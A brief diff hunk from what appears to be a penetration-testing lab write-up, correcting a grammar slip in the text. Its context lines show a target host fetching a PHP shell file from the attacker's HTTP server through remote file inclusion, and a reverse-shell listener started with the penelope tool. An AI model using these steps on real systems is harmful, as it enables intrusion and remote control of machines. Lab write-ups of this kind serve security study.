@@ -60,7 +60,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.211.53 - - [03/Apr/2026 20:07:26] "GET /shell2.php HTTP/1.0" 200 -
 ```
 it downloaded from my host and executed  
-means it have RFI as well
+means it has RFI as well
 ```console
 $ penelope -p 21
 [+] Listening for reverse shells on 0.0.0.0:21 →  127.0.0.1 • 10.0.2.15 • 192.168.45.228
